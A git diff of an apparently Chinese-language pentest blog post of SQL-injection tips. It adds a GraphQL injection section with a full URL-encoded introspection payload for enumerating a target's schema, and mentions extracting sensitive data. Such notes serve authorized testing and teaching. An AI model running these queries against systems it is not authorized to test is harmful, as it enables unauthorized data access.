@@ -2,7 +2,7 @@
 title: "SQL注入在实战中的Tips合集"
 slug: "sqli-tricks-in-pentest"
 description: "已经...要....变成脚本小子的模样了!!!"
-date: 2023-07-05T21:37:07+08:00
+date: 2023-07-08T21:22:07+08:00
 categories: ["NOTES&SUMMARY"]
 series: []
 tags: ["PENTEST", "SQLi"]
@@ -10,7 +10,7 @@ draft: false
 toc: true
 ---
 
-锐意更新中:)
+从实战中总结的一些小技巧，希望能帮助到一些人www
 
 ----
 
@@ -99,3 +99,35 @@ MDUT自带了HTTP隧道功能，还有常见的提权一把梭+列系统文件
 5. *如果不能外连但为高权限用户，尝试执行java代码反弹（待补充）
 
 6. Navicat或DBeaver查看数据库内具体内容；Navicat可以使用对应的隧道
+
+## GraphQL注入
+
+graphql有比较特殊的语法和查询方式，是便于前后端交互的语言 而不是便于后端和数据库交互的语言，后端数据都以graph 图的结构进行保存，需要设置好清晰的访问控制 不然就会被一锅端——graph的内省特性允许我们枚举数据库类型信息（见下）
+
+graphql本身就很少见 在实战环境中更是少中又少，但我之前hvv还真见过这种站点，怎么发现端点的不太记得清了（不是dirsearch就是burpsuite扒请求记录），这里简单记录一下实操过程：
+
+```
+https://example.com/graphql?query=xxxxx
+```
+
+存在这样的可访问端点，直接用内省的payload枚举数据库结构信息
+
+```
+/graphql?query=fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}
+```
+
+再使用https://graphql-kit.com/graphql-voyager/进行图的生成
+
+![image-20230707152257406](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230707152257406.png)
+
+![image-20230707150342238](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230707150342238.png)
+
+通过可视化的结构构造查询数据的payload，构造方式参见 [官方文档](https://graphql.cn/learn/queries/)或 [这个仓库](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection)
+
+![image-20230707150640501](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230707150640501.png)
+
+拿到敏感数据就可以轻松愉快的写报告了，几百分轻松get~
+
+当然了，如果站点做了详细的鉴权 那么所有的查询都是需要token的，没有token的我们只能到此为止了QAQ
+
+![image-20230707150842841](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230707150842841.png)
